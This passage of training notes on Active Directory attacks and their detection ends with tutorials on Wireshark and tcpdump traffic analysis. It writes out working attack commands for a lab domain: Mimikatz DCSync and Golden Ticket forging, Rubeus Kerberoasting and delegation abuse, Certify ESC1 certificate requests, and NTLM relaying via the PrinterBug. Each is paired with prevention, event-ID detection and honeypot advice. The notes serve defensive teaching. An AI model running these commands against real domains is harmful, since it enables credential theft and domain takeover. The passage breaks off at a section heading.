$TimeSpan = (Get-Date) - (New-TimeSpan -Minutes 15)

# Search for event ID 5136 (GPO modified) in the past 15 minutes
$Logs = Get-WinEvent -FilterHashtable @{LogName='Security';id=5136;StartTime=$TimeSpan} -ErrorAction SilentlyContinue |`
Where-Object {$_.Properties[8].Value -match "CN={73C66DBB-81DA-44D8-BDEF-20BA2C27056D},CN=POLICIES,CN=SYSTEM,DC=EAGLE,DC=LOCAL"}

if($Logs){
    $emailBody = "Honeypot GPO '73C66DBB-81DA-44D8-BDEF-20BA2C27056D' was modified`r`n"
    $disabledUsers = @()
    ForEach($log in $logs){
        If(((Get-ADUser -identity $log.Properties[3].Value).Enabled -eq $true) -and ($log.Properties[3].Value -notin $disabledUsers)){
            Disable-ADAccount -Identity $log.Properties[3].Value
            $emailBody = $emailBody + "Disabled user " + $log.Properties[3].Value + "`r`n"
            $disabledUsers += $log.Properties[3].Value
        }
    }
    # Send an alert via email - complete the command below
    # Send-MailMessage
    $emailBody
}
```

If the honeypot GPO is modified, the script outputs the following, or sends an email alert if configured:

```
Honeypot GPO '73C66DBB-81DA-44D8-BDEF-20BA2C27056D' was modified
Disabled user bob
```

After disabling, Event ID 4725 logs the account disabling action.

#### **GPP\_Passwords**

**Description**

SYSVOL is a network share on all Domain Controllers, containing logon scripts, group policy data, and other required domain-wide data. Active Directory stores all group policies in `\\\\<DOMAIN>\\SYSVOL\\<DOMAIN>\\Policies\\`. With the release of Windows Server 2008, Group Policy Preferences (GPP) introduced the ability to store and use credentials in several scenarios. Active Directory stores these in the policies directory in SYSVOL.

During engagements, we might encounter scheduled tasks and scripts executed under a specific user, containing the username and an encrypted version of the password in XML policy files. The encryption key that Active Directory uses to encrypt these XML files was released publicly, allowing anyone to decrypt credentials in the policy files. Since SYSVOL is accessible to all `Authenticated Users` in the domain, anyone with access can decrypt the credentials.

Microsoft published the AES private key on MSDN. Here’s an example of an XML file containing an encrypted password, where the property is named `cpassword`.

**Attack**

To abuse GPP Passwords, we use the `Get-GPPPassword` function from **PowerSploit**, which parses XML files in SYSVOL’s Policies folder, finds those with the `cpassword` property, and decrypts them:

```
PS C:\\Users\\bob\\Downloads> Import-Module .\\Get-GPPPassword.ps1
PS C:\\Users\\bob\\Downloads> Get-GPPPassword

UserName  : svc-iis
NewName   : [BLANK]
Password  : abcd@123
Changed   : [BLANK]
File      : \\\\EAGLE.LOCAL\\SYSVOL\\eagle.local\\Policies\\{73C66DBB-81DA-44D8-BDEF-20BA2C27056D}\\Machine\\Preferences\\Groups\\Groups.xml
NodeName  : Groups
Cpassword : qRI/NPQtItGsMjwMkhF7ZDvK6n9KlOhBZ/XShO2IZ80
```

**Prevention**

Once the encryption key was made public and began being exploited, Microsoft released **KB2962486** in 2014 to prevent caching credentials in GPP. However, the patch does not clear existing credentials, only prevents the caching of new ones.

- Environments created pre-2014 may still have cached credentials.
- Regularly assess and review the environment to ensure no credentials are exposed.

**Detection**

There are two main detection techniques for this attack:

1. **Auditing File Access to XML with Credentials**:
  - Monitoring access to these XML files is a good indicator of malicious intent if no legitimate reason exists for accessing these files.
  - Generate an event when a user reads the file by enabling auditing.
  - Each access will generate **Event ID 4663**.
2. **Logon Attempts with Exposed Credentials**:
  Successful logons, especially from unexpected locations, can be correlated with known usage locations of service accounts.
  - Logon attempts (successful or failed) with the exposed service account credentials can trigger events:
    - **Event ID 4624** (successful logon)
    - **Event ID 4625** (failed logon)
    - **Event ID 4768** (TGT requested).

**Honeypot**

Setting up a trap account is a good detection strategy:

- Use a **service account** with an incorrect password as a honeypot.
- Ensure the honeypot has properties that make it appear legitimate:
  - The password is old.
  - Last password change predates the modification of the GPP XML file.
  - The account simulates logon activity (via a dummy task).

If any failed or successful logon attempts with this account occur (outside of the dummy task), it may indicate malicious activity.

**Relevant Event IDs for Failed Logons with Honeypot**

- **4625** - Failed logon.
- **4771** - Kerberos pre-authentication failure.
- **4776** - NTLM authentication failure.

By leveraging honeypot accounts, you can detect potential attacks while minimizing the risk of false positives.

#### **Golden Ticket**

**Description**

The Kerberos Golden Ticket is an attack in which threat agents can create or generate tickets for any user in the Domain, effectively acting as a Domain Controller.

When a Domain is created, the unique user account `krbtgt` is created by default; `krbtgt` is a disabled account that cannot be deleted, renamed, or enabled. The Domain Controller's KDC service will use the password of `krbtgt` to derive a key with which it signs all Kerberos tickets. This password's hash is the most trusted object in the entire Domain because it guarantees that the Domain issued Kerberos tickets.

Any user possessing the password's hash of `krbtgt` can create valid Kerberos TGTs. Because `krbtgt` signs them, forged TGTs are considered valid tickets within an environment. Previously, it was even possible to create TGTs for inexistent users and assign any privileges to their accounts. The Golden Ticket attack allows us to escalate rights from any child domain to the parent in the same forest, enabling persistence and control over the domain.

This attack provides elevated persistence in the domain and occurs after an adversary has gained Domain Admin (or similar) privileges.

**Attack**

To perform the Golden Ticket attack, use Mimikatz with the following arguments:

- `/domain`: The domain's name.
- `/sid`: The domain's SID value.
- `/rc4`: The password's hash of `krbtgt`.
- `/user`: The username for which Mimikatz will issue the ticket.
- `/id`: Relative ID (last part of SID) for the user for whom Mimikatz will issue the ticket.

Additionally, advanced threat agents specify values for the `/renewmax` and `/endin` arguments to avoid detection:

- `/renewmax`: The maximum number of days the ticket can be renewed.
- `/endin`: End-of-life for the ticket.

**Step 1: Obtain krbtgt Hash and SID**

Using DCSync with Rocky's account to obtain the hash:

```
mimikatz # lsadump::dcsync /domain:eagle.local /user:krbtgt

SAM Username: krbtgt
Hash NTLM: db0d0630064747072a7da3f7c3b4069e
SID: S-1-5-21-1518138621-4282902758-752445584
```

**Step 2: Create Golden Ticket**

Run Mimikatz with the `kerberos::golden` command:

```
mimikatz # kerberos::golden /domain:eagle.local /sid:S-1-5-21-1518138621-4282902758-752445584 /rc4:db0d0630064747072a7da3f7c3b4069e /user:Administrator /id:500 /renewmax:7 /endin:8 /ptt
```

Verifying with `klist`:

```
C:\\Mimikatz>klist
```

**Prevention**

Preventing forged tickets is challenging, but some preventive steps include:

1. Block privileged users from authenticating to any device.
2. Periodically reset the `krbtgt` password.
3. Enforce `SIDHistory` filtering to prevent cross-domain escalation.

**Detection**

Correlate users' behavior to detect abuse of forged tickets, especially looking for:

- Events with ID 4624 and 4625 for suspicious logons.
- TGS requests without a prior TGT, indicating a potential Golden Ticket.
- If `SIDHistory` filtering is enabled, monitor for event ID 4675 for cross-domain escalation.

**Note**

If an AD forest is compromised, reset all users' passwords, revoke certificates, and reset `krbtgt`'s password twice to clear any old passwords, with each reset at least 10 hours apart.

`[Download the Golden_Ticket.md file](sandbox:/mnt/data/Golden_Ticket.md)`

#### **Kerberoasting**

**Description**

In Active Directory (AD), a **Service Principal Name (SPN)** is a unique identifier for service instances. SPNs allow Kerberos to authenticate clients to services without needing the service’s account name. When a Kerberos TGS service ticket is requested, it’s encrypted with the service account's NTLM hash.

**Kerberoasting** is a post-exploitation attack where attackers obtain a service ticket and perform offline password cracking on it. If successful, they can retrieve the service account password. Attack success hinges on the strength of the service account's password and the encryption algorithm used:

- **AES** (strongest but slow to crack)
- **RC4** (commonly vulnerable)
- **DES** (rarely used, only in very old environments)

Despite security recommendations to disable RC4 and DES, they are often still in use, making Kerberoasting a viable attack.

**Attack Path**

1. **Extracting Crackable Tickets**: Using tools like Rubeus, tickets for all users with SPNs can be obtained:
  ```
  PS C:\\Users\\bob\\Downloads> .\\Rubeus.exe kerberoast /outfile:spn.txt
  ```
  This will save extracted TGS hashes for each SPN user to `spn.txt`.
2. **Cracking Tickets**: The TGS hashes are then moved to a cracking tool (e.g., hashcat on Kali Linux).
  ```
  hashcat -m 13100 -a 0 spn.txt passwords.txt --outfile="cracked.txt"
  ```
  - **Hashcat Mode 13100**: Specifically for Kerberoastable TGS hashes.
  - **Password Cracking**: Utilizes a dictionary file (e.g., `passwords.txt`) to identify weak passwords.
3. **View Results**: Successfully cracked tickets reveal the service account password in plain text.
  ```
  cat cracked.txt
  ```

**Prevention**

The attack’s success largely depends on weak service account passwords. To protect against Kerberoasting:

- **Use Strong Passwords**: Set long, random passwords (100+ characters).
- **Limit SPN Accounts**: Only assign SPNs where necessary and disable unused SPNs.
- **Group Managed Service Accounts (GMSA)**: Automatically managed and periodically rotated passwords.

**Detection**

Kerberoasting leaves a footprint in Windows Event Log ID 4769, generated on TGS requests. Although monitoring every Event ID 4769 might be overwhelming, specific patterns can signal suspicious activity:

1. **Alert on RC4 Tickets**: If the environment only uses AES, flag Event ID 4769 with RC4 ticket requests.
2. **High Volume of TGS Requests**: Monitor for unusually high numbers of TGS requests from a single user/machine.
3. **Honeypot Accounts**: Configure a honeypot user account with no valid role but set privileges, ensuring it’s old and has an SPN. Any TGS request for this account is likely malicious.

**Honeypot Account Configuration**

1. **Old User with Privileges**: Choose an account unused for 2+ years.
2. **Strong Password**: Ensure it’s uncrackable.
3. **SPN Registration**: Assign an SPN typical for production services (e.g., IIS or SQL).

Example honeypot setup:

- **User**: `svc-iam` with SPN but not actively used.

**Caution**

Implementing honeypots for every detection type can expose a pattern to attackers. Choose detections that best suit the environment, balancing security and stealth.

#### **Kerberos Constrained Delegation**

**Description**

Kerberos Delegation allows an application to access resources hosted on a different server without directly assigning access to the service account. For instance, a web server service account can be delegated to access SQL server service, enabling user access to the database content they are provisioned for without direct database access.

**Types of Delegation in Active Directory**

1. **Unconstrained Delegation** - Most permissive, allows delegation to any service.
2. **Constrained Delegation** - Configures user properties to limit services they can delegate to.
3. **Resource-based Delegation** - Configured within the computer object for selective trust, less common in production.

**Security Consideration**: Any type of delegation can pose security risks and should be avoided unless necessary.

**Attack**

The example focuses on abusing constrained delegation. When an account is trusted for delegation, it can request Kerberos tickets for other services.

**Example Steps:**

1. **Identify Accounts with Constrained Delegation**
  ````
  PS C:\\\\Users\\\\bob\\\\Downloads> Get-NetUser -TrustedToAuth

  Example Output:
  ```plaintext
  distinguishedname : CN=web service,CN=Users,DC=eagle,DC=local
  msds-allowedtodelegateto : {http/DC1.eagle.local/eagle.local, http/DC1.eagle.local}
  useraccountcontrol : TRUSTED_TO_AUTH_FOR_DELEGATION
  ````
2. **Hash the Password** using Rubeus for the compromised account password `Slavi123`.
  ```
  PS C:\\\\Users\\\\bob\\\\Downloads> .\\\\Rubeus.exe hash /password:Slavi123
  ```
  Example Output:
  ```
  rc4_hmac : FCDC65703DD2B0BD789977F1F3EEAECF
  ```
3. **Request Kerberos Ticket** for the `Administrator` account using Rubeus.
  ```
  PS C:\\\\Users\\\\bob\\\\Downloads> .\\\\Rubeus.exe s4u /user:webservice /rc4:FCDC65703DD2B0BD789977F1F3EEAECF /domain:eagle.local /impersonateuser:Administrator /msdsspn:"http/dc1" /dc:dc1.eagle.local /ptt
  ```
4. **Verify Ticket Injection** with `klist`.
  ```
  PS C:\\\\Users\\\\bob\\\\Downloads> klist
  ```
5. **Connect to Domain Controller**.
  ```
  PS C:\\\\Users\\\\bob\\\\Downloads> Enter-PSSession dc1
  ```

**Prevention**

1. Set privileged users with the property **Account is sensitive and cannot be delegated**.
2. Add privileged users to the **Protected Users** group, which applies enhanced security against delegation.

**Password Security**: Use cryptographically secure passwords to avoid Kerberoasting attacks.

**Detection**

- Correlate users' behavior
- Monitor events with ID 4624 (successful logon)
- Check Transited Services attribute in event logs for S4U logon process

#### **Object\_ACLs\_in Active Directory**

**Description**

In Active Directory (AD), **Access Control Lists (ACLs)** determine who can access specific objects and the type of access they have. Each ACL has multiple **Access Control Entries (ACEs)** that define the trustee and access type. ACLs are critical not only for access control but also for auditing attempts on securable objects in AD. Examples of ACL delegations include allowing non-admin users specific privileges, like resetting passwords or modifying group memberships.

In practical AD environments, misconfigurations in ACLs are common and may include:

- Domain users with Administrator access to servers.
- Overly permissive permissions, allowing "Everyone" full rights.
- Domain users having access to computer extended properties, such as LAPS passwords.

**Attack: Identifying Abusable ACLs**

Tools like **BloodHound** and **SharpHound** can help visualize relationships and identify potential ACL misconfigurations. For instance:

```
.\\SharpHound.exe -c All
```

The scan results (ZIP file) from **SharpHound** can be analyzed in BloodHound to discover escalation paths. Focusing on user "Bob" reveals that:

1. **Full Rights over User Anni**: Bob can modify Anni's attributes (e.g., adding an SPN for Kerberoasting or resetting her password).
2. **Control over Server01**: Bob can retrieve the local administrator password or leverage Resource-Based Kerberos Delegation, especially since Server01 is trusted for Unconstrained Delegation.

**ADACLScanner** is another tool that can help generate DACL and SACL reports to detect similar issues.

**Prevention**

1. **Continuous Assessment**: Regularly review AD for misconfigurations and abusable ACLs.
2. **Privilege Education**: Train privileged users on best practices to prevent accidental privilege delegation.
3. **Automate Access Management**: Streamline access assignments and restrict privilege modifications to reduce the risk of unintended access rights.

**Detection**

Several events can indicate ACL abuse:

- **Event ID 4738** ("A user account was changed"): Logs when a user is modified, but without details (e.g., SPN additions).
- **Event ID 4724**: Captures password reset events, potentially after ACL abuse.
- **Event ID 4742**: Logs when a computer object is modified, useful for detecting suspicious changes on servers.

Naming conventions for privileged users (e.g., "adminxxxx") can also help identify unauthorized modifications by non-privileged users.

**Honeypot Strategy**

Misconfigured ACLs can also act as a detection mechanism:

1. **High ACL Assignment to Honeypot Accounts**: Assign high permissions to honeypot accounts with exposed credentials to lure attackers.
2. **Modifiable Honeypot User**: Allow general users to modify a designated honeypot account. Any activity involving this account (e.g., event ID 4738) should trigger alerts.

An example detection mechanism could involve monitoring changes to Anni’s account by Bob. Any suspicious modification by Bob to Anni’s account or Server01 can trigger alerts and initiate forensic investigations if suspicious activity is confirmed.

---

**Note**: Implementing detection mechanisms, especially for honeypots, helps maintain visibility over unauthorized changes and can preemptively alert security teams to potential privilege escalation attempts.

#### **PKI\_ESC1**

**Description**

The **Certified Pre-Owned** research paper by SpectreOps highlighted Active Directory Certificate Services (AD CS) as a popular attack vector due to its common misconfigurations. Certificates are highly advantageous for attackers because:

- Certificates are valid long-term, often for a year or more.
- User password resets don’t invalidate certificates.
- Misconfigured templates allow attackers to obtain certificates for other users.
- Compromising a Certificate Authority (CA) private key enables forging "Golden Certificates."

One notable privilege escalation attack method is **ESC1**, which involves:

- No issuance requirements.
- Enrollable client authentication/smart card logon OID templates.
- The `CT_FLAG_ENROLLEE_SUPPLIES_SUBJECT` flag.

**Attack Execution: ESC1 Example**

1. **Scan for Vulnerabilities** with **Certify**:
  ```
  .\\Certify.exe find /vulnerable
  ```
  The output will identify vulnerable certificate templates. Here, **UserCert** is identified as vulnerable due to:
  - Accessible by all domain users.
  - Allows requester-supplied SAN (allows impersonating other users).
  - No manager approval required.
  - Supports client authentication for login.
2. **Abuse the Template** by requesting a certificate for the "Administrator" user:
  ```
  .\\Certify.exe request /ca:PKI.eagle.local\\eagle-PKI-CA /template:UserCert /altname:Administrator
  ```
  This generates a PEM-format certificate, which can be converted to **PFX** for compatibility with tools like **Rubeus**.
3. **Convert PEM to PFX**:
  ```
  sed -i 's/\\s\\s\\+/\\n/g' cert.pem
  openssl pkcs12 -in cert.pem -keyex -CSP "Microsoft Enhanced Cryptographic Provider v1.0" -export -out cert.pfx
  ```
4. **Use Rubeus to Request a TGT** for the Administrator account:
  ```
  .\\Rubeus.exe asktgt /domain:eagle.local /user:Administrator /certificate:cert.pfx /dc:dc1.eagle.local /ptt
  ```
  Successful authentication as the Administrator will allow access to resources on DC1, such as listing contents of `\\\\dc1\\c$`.

**Prevention**

Preventing the ESC1 attack involves:

- Disabling `CT_FLAG_ENROLLEE_SUPPLIES_SUBJECT` in certificate templates.
- Enforcing **CA certificate manager approval** for certificate issuance to ensure only legitimate requests are approved.

Regular PKI environment scans with **Certify** or similar tools are recommended to identify and mitigate PKI misconfigurations.

**Detection**

1. **Event IDs 4886 and 4887**: AD logs events for certificate requests (4886) and certificate issuance (4887). These logs indicate certificate issuance activity but do not specify SAN values.
2. **Listing Issued Certificates**: Checking the CA’s issued certificate list can reveal certificates issued with the vulnerable template, although SAN details require manual review.
3. **Event ID 4768**: Logs the TGT request when the certificate is used for authentication.

To automate detection, use **certutil**:

```
certutil -view
```

Example to find logs programmatically:

```
$events = Get-WinEvent -FilterHashtable @{Logname='Security'; ID='4886'}
$events[0] | Format-List -Property *
```

**Remote Session Monitoring**

If direct GUI access is unavailable, use **PSSession** to access the PKI machine and query for certificate issuance events:

```
New-PSSession -ComputerName PKI
Enter-PSSession -ComputerName PKI
Get-WinEvent -FilterHashtable @{Logname='Security'; ID='4886'}
Get-WinEvent -FilterHashtable @{Logname='Security'; ID='4887'}
```

---

**Note**: Monitoring and auditing PKI activities for unauthorized certificate issuance is critical to maintaining a secure AD CS environment.

#### **Print\_Spooler&NTLM\_Relaying**

**Description**

The Print Spooler is an old service, enabled by default even in the latest Windows Desktop and Server versions. This service became a popular attack vector after the discovery of the "PrinterBug" by Lee Christensen in 2018. The functions `RpcRemoteFindFirstPrinterChangeNotification` and `RpcRemoteFindFirstPrinterChangeNotificationEx` can be exploited to make a remote machine connect to any reachable device, carrying authentication info in the form of a TGT. Microsoft deemed this bug a "by-design" issue and has not issued a fix.

**Impact**

If a Domain Controller (DC) with the Print Spooler enabled is compromised, the attacker can:

- **Relay the connection to another DC** and perform DCSync if SMB Signing is disabled.
- **Force the DC to connect to a machine configured for Unconstrained Delegation (UD)**, caching the TGT in the UD server's memory, which tools like Rubeus and Mimikatz can capture.
- **Relay the connection to Active Directory Certificate Services**, allowing threat agents to obtain a certificate for the DC, usable for authenticating as the DC (e.g., DCSync).
- **Configure Resource-Based Kerberos Delegation** for the relayed machine, enabling abuse to authenticate as any Administrator on that machine.

**Attack Methodology**

In this scenario, we'll relay the DC connection to another DC and perform DCSync, provided SMB Signing is off on Domain Controllers.

**Step-by-Step Attack Execution**

1. **Configure NTLMRelayx** to forward connections to DC2 and attempt DCSync:
  ```
  impacket-ntlmrelayx -t dcsync://172.16.18.4 -smb2support
  ```
  Sample Output:
  ```
  Impacket v0.10.0 - Copyright 2022 SecureAuth Corporation
  [*] Protocol Client SMTP loaded..
  [*] Protocol Client LDAP loaded..
  ...
  [*] Servers started, waiting for connections
  ```
2. **Trigger the PrinterBug** using Dementor, with NTLMRelayx listening:
  ```
  python3 ./dementor.py 172.16.18.20 172.16.18.3 -u bob -d eagle.local -p Slavi123
  ```
  Sample Output:
  ```
  [*] connecting to 172.16.18.3
  [*] bound to spoolss
  [*] getting context handle...
  ...
  [-] exception RPRN SessionError: code: 0x6ab - RPC_S_INVALID_NET_ADDR - The network address is invalid.
  ```
3. **Check NTLMRelayx for DCSync Success** - Hashes should appear in the NTLMRelayx terminal.

**Prevention**

- **Disable Print Spooler** on all non-printing servers, especially on Domain Controllers.
- **Registry Key Setting**: Use `RegisterSpoolerRemoteRpcEndPoint` to block remote requests:
  - Set to `1` to enable.
  - Set to `2` to disable remote access.

**Detection**

Exploiting PrinterBug leaves traces of network connections to the DC, though these are too generic for reliable detection.

- **Log Correlation**: Track all logon attempts from core infrastructure servers by IP address. When NTLMRelayx performs DCSync, no event ID 4662 is generated, but there will be a successful logon event from the IP address of the attacking machine.

**Honeypot Strategy**

Using the PrinterBug as a honeypot can alert on suspicious activity by:

- Blocking outbound connections on ports 139 and 445 from servers, which will alert blue teams on compromised reverse connections.
- **Considerations**: Ensure proper log monitoring and be prepared to respond quickly, especially if any new vulnerabilities allowing RCE without reverse connection arise.

---

**Note**: Implement honeypot measures only if the organization is mature enough to act promptly on alerts.

**6. Intro to Network Traffic Analysis**

#### **Decrypting RDP Connections**

| **Task** | **Description** | **Command/Details** |
|---|---|---|
| **Task 1: Open RDP PCAP in Wireshark** | Unzip `RDP-analysis.zip` and open the `rdp.pcapng` file in Wireshark. | Extract the file, then open `rdp.pcapng` in Wireshark. |
| **Task 2: Initial RDP Traffic Analysis** | Apply an RDP filter to identify RDP traffic within the capture. | **RDP Filter**: `rdp`**Verify Port 3389**: `tcp.port == 3389` |
| **Task 3: Add Decryption Key in Wireshark** | Use the RDP key found on Bob's host to decrypt RDP traffic in Wireshark. | **Steps**:1. Go to **Edit** → **Preferences** → **Protocols** → **TLS**.2. Click **Edit** under RSA keys list and add new entry:- IP: `10.129.43.29`- Port: `3389`- Protocol: `tpkt` or blank- Key File: Browse and add the server.key file.3. Save and refresh the pcap file. |
| **Task 4: Decrypted RDP Traffic Analysis** | Reapply the RDP filter after decryption to view and analyze unencrypted RDP traffic. | **Filter**: `rdp` (or follow TCP streams to examine data further) |
| **Questions** |  |  |
| **Initiating Host IP** | Identify the IP address of the host initiating the RDP session. | **Answer**: Check the IP in the first packet (#8) of the three-way handshake. Host initiating connection: `10.129.43.27` |
| **Username Used** | Examine RDP traffic for user credentials, often visible in ASCII within an "Ignored Unknown Record" entry when filtered by `tcp.port == 3389`. | **Answer**: Use ASCII details in "Ignored Unknown Record" entry to view username. |
| **Summary** | Wireshark’s ability to decrypt and analyze captured RDP traffic, given an RSA key, demonstrates its power in forensic analysis and incident response. | **Key Insight**: With an encryption key, Wireshark can decrypt various encrypted protocols (e.g., RDP) to facilitate in-depth packet analysis for IR purposes. |

#### **Interrogating Network Traffic With Capture and Display Filters**

**Lab Objectives**

- Practice filtering captured network traffic to extract meaningful data.
- Identify servers answering DNS and HTTP/S requests.
- Analyze traffic patterns and connections.

| **Task** | **Description** | **Command/Details** |
|---|---|---|
| **Task 1: Read a Capture File Without Filters** | Begin by examining the `.pcap` file without applying any filters. | `tcpdump -r (file.pcap)` |
| **Task 2: Identify Traffic Types** | Examine the traffic to identify protocols and ports. | - **Common Protocols**: DNS, HTTP, HTTPS- **Ports Utilized**: 53 (DNS), 80 (HTTP), 443 (HTTPS) |
| **Task 3: Identify Conversations and Patterns** | Analyze for patterns between servers and hosts. | - **Patterns**: Connections between server and host- **Three-Way Handshake**: Note client/server ports- **Servers**: Communicate over well-known ports- **Receiving Hosts**: Use high random ports- Command with Absolute Sequence Numbers: `tcpdump -S -r (file.pcap)` |
| **Task 4: In-Depth Capture Analysis** | Answer questions on timestamps, DNS responses, and protocols. | - **First Conversation Timestamp**: Look for first TCP handshake (SYN/SYN-ACK/ACK)- **DNS Server Response**: IP for `apache.org`- **Protocol**: Identify via port numbers- **Example Commands**: `tcpdump -r (file.pcap) -nntcpdump -r (file.pcap) src host [host-name]` |
| **Task 5: Filter Out Non-DNS Traffic** | Filter to isolate DNS traffic for analysis on domain names and DNS records. | - **Filter for DNS Traffic**: `sudo tcpdump -r (file.pcap) udp and port 53`- **Hex and ASCII Output**: `tcpdump -X -r (file.pcap)` |
| **Task 6: Filter for TCP (HTTP/HTTPS) Traffic** | Isolate HTTP/HTTPS traffic to identify web servers and analyze HTTP requests. | - **Filter Command**: `tcpdump -r (file.pcap) 'port 80 or port 443'`- **Analyze Requests**: Identify common HTTP methods (e.g., GET, POST) and response codes |
| **Task 7: Analyze First Conversation Server** | Examine the server in the first conversation for application or server type details. | - **Command with Hex and ASCII Output**: `tcpdump -X -r (file.pcap)`- **Check Server Response**: Look for clues in the HTTP response data for application/server information |

**Analysis Tips**

Consider these questions to guide your analysis:

- What types of traffic are present (protocols, ports)?
- How many unique conversations and hosts?
- What is the timestamp of the first TCP conversation?
- How can traffic be filtered to simplify analysis?
- Which servers are responding on well-known ports?
- What types of DNS records and HTTP methods are used?

#### **Packet Inception, Dissecting Network Traffic With Wireshark**

| **Task** | **Description** | **Steps** |
|---|---|---|
| **Task #1: Open PCAP** | Open a pre-captured file to analyze HTTP traffic. | 1. **Open Wireshark.**2. Select **File → Open** and browse to `Wireshark-lab-2.pcap`.3. Open the file to display all traffic in the capture. |
| **Task #2: Filter HTTP Traffic** | Apply a filter to focus only on HTTP (port 80) traffic, helping identify HTTP requests and responses, especially `200 OK` responses indicating file transfers. | 1. In the **Display Filter** toolbar, type `http`.2. Ensure the filter bar lights up green, indicating correct syntax.3. Review the HTTP traffic, looking for `GET` requests and `200 OK` responses. This shows files being requested and successfully sent. |
| **Task #3: Follow TCP Stream** | Select an HTTP packet with `200 OK` and follow the stream to verify the data transfer. | 1. Choose an HTTP packet with `200 OK` in the **Info** field.2. **Right-click** and select **Follow → TCP Stream**.3. A new window shows the full stream; Wireshark automatically applies `tcp.stream eq #` to filter that conversation. Validate that the file transfer happened in this stream. |
| **Task #4: Filter for JFIF Images** | Check for JPEG images in the HTTP traffic by filtering for JFIF format, commonly used in JPEG images, to locate any embedded image files in the data transfer. | 1. Clear previous filters.2. Type `http && image-jfif` in the **Display Filter** toolbar to focus on HTTP packets with JFIF content.3. This filter should reveal only packets containing JPEG image files, simplifying the view to a few relevant packets. |
| **Task #5: Export Images** | Export the identified image files from the HTTP traffic for further examination. | 1. Select **File → Export Objects → HTTP**.2. Locate and save the relevant image file(s) (e.g., `file.JPG`).3. Save the file locally to complete the extraction. These images can now be reviewed for any hidden or suspicious data requested by the security manager. |

#### **Tcpdump Fundamentals**

**Introduction to Tcpdump**

**Tcpdump** is a command-line packet sniffer that captures and interprets data frames from network interfaces. Available on Unix-based systems, Tcpdump can capture packets from the network "off the wire" and is widely used for traffic analysis, troubleshooting, and forensic purposes. It requires root privileges to access hardware and run effectively, typically via `sudo`. Windows users can use **WinDump** or run a Linux distribution in WSL to leverage Tcpdump on Windows.

**Basic Capture Options**

Tcpdump provides many switches to modify captures. Here are key options:

| **Switch** | **Description** |
|---|---|
| `-D` | Display available interfaces. |
| `-i` | Select an interface to capture from, e.g., `-i eth0`. |
| `-n` | Do not resolve hostnames. |
| `-nn` | Do not resolve hostnames or port names. |
| `-e` | Include Ethernet header in the output. |
| `-X` | Show packet contents in hex and ASCII. |
| `-v`, `-vv`, `-vvv` | Increase verbosity level. |
| `-c` | Capture a specific number of packets then exit. |
| `-s` | Specify the packet capture length. |
| `-S` | Show absolute sequence numbers. |
| `-q` | Print minimal protocol info. |
| `-r` | Read from a file. |
| `-w` | Write to a file. |
|  |  |

**Display Available Interfaces**

```
sudo tcpdump -D
```

**Capture Traffic on a Specific Interface**

```
sudo tcpdump -i eth0
```

**Disable Host and Port Resolution**

```
sudo tcpdump -i eth0 -nn
```

**Include Ethernet Header in Capture**

```
sudo tcpdump -i eth0 -e
```

**Show Hex and ASCII Output**

```
sudo tcpdump -i eth0 -X
```

**Combine Multiple Options**

```
sudo tcpdump -i eth0 -nnvXX
```

**Tcpdump Output Breakdown**

Tcpdump output can include various fields:

| **Field** | **Description** |
|---|---|
| **Timestamp** | Shows time of capture. |
| **Protocol** | Upper-layer protocol (e.g., IP). |
| **Source & Destination IP/Port** | Shows the connection path and ports. |
| **Flags** | Displays any TCP flags used. |
| **Sequence & Ack Numbers** | Used to track TCP segments. |
| **Protocol Options** | TCP options like window size, SACK, etc. |

**File Input/Output with Tcpdump**

**Save Captures to a File**

```
sudo tcpdump -i eth0 -w ~/output.pcap
```

**Read Captures from a File**

```
sudo tcpdump -r ~/output.pcap
```

To increase detail when reading from a file, add relevant switches.

**Advanced Tcpdump Use**

Tcpdump can act as a basic IDS by using filters in a script to detect specific patterns, such as repeated ICMP requests from a single IP, and can then trigger automated responses.

#### **Tcpdump Packet Filtering**

Using advanced filtering options allows us to reduce the amount of traffic printed to output or written to disk, thereby saving space and speeding up data processing. Filters can be paired with standard tcpdump syntax to capture broadly or narrow down to specific hosts or TCP flags. Advanced filters enable tailored captures.

**Helpful Tcpdump Filters**

| **Filter** | **Result** |
|---|---|
| `host` | Filters visible traffic to show anything involving the designated host (bi-directional). |
| `src`/`dest` | Designate source or destination host or port. |
| `net` | Filters traffic from or to the specified network using / notation. |
| `proto` | Filters for a specific protocol (e.g., ether, TCP, UDP, ICMP). |
| `port` | Filters any traffic with the specified port as source or destination. |
| `portrange` | Allows filtering by port range (e.g., 0-1024). |
| `less`/`greater` | Filters packets based on size. |
| `and`/`&&` | Combines filters, showing packets that meet both conditions. |
| `or` | Matches any of two conditions. |
| `not` | Negates a condition, e.g., `not UDP` shows non-UDP traffic. |

**Examples of Common Filters**

- **Host Filter**
  ```
  sudo tcpdump -i eth0 host 172.16.146.2
  ```
- **Source/Destination Filter**
  ```
  sudo tcpdump -i eth0 src host 172.16.146.2
  ```
- **Source Port Filter**
  ```
  sudo tcpdump -i eth0 tcp src port 80
  ```
- **Destination Net Filter**
  ```
  sudo tcpdump -i eth0 dest net 172.16.146.0/24
  ```
- **Protocol Filter by Name**
  ```
  sudo tcpdump -i eth0 udp
  ```
- **Protocol Filter by Number**
  ```
  sudo tcpdump -i eth0 proto 17
  ```
- **Port Filter**
  ```
  sudo tcpdump -i eth0 tcp port 443
  ```
- **Port Range Filter**
  ```
  sudo tcpdump -i eth0 portrange 0-1024
  ```
- **Less/Greater Filter**
  ```
  sudo tcpdump -i eth0 less 64
  ```
- **Greater Filter for Packets Over 500 Bytes**
  ```
  sudo tcpdump -i eth0 greater 500
  ```

**Combining Filters with**`AND`**and**`OR`

- **AND Filter Example**
  ```
  sudo tcpdump -i eth0 host 192.168.0.1 and port 23
  ```
- **OR Filter Example**
  ```
  sudo tcpdump -r sus.pcap icmp or host 172.16.146.1
  ```
- **NOT Filter Example**
  ```
  sudo tcpdump -r sus.pcap not icmp
  ```

**Pre-Capture vs. Post-Capture Processing**

Applying filters during capture omits unmatched traffic, reducing data volume but risking the loss of potentially valuable information. Filtering during post-capture analysis parses the capture file, displaying only packets that meet the filter criteria without altering the original file.

**Interpreting Tips and Tricks**

- **Absolute Sequence Numbers**: Use `S` to display them for detailed tracking.
- **Verbose Output**: Use `v`, `X`, and `e` for capturing more data.
- **Selective Display**: Options like `c`, `n`, `s`, `S`, and `q` help modify displayed data.
- **ASCII Display**: Use `A` to show only ASCII text, useful for human-readable output.

**ASCII Mode with**`-A`

```
sudo tcpdump -Ar telnet.pcap
```

**Piping Output to Grep**

```
sudo tcpdump -Ar http.cap -l | grep 'mailto:*'
```

This method filters output to quickly search for specific terms or patterns within the capture.

**Advanced Packet Filtering Using TCP Flags**

```
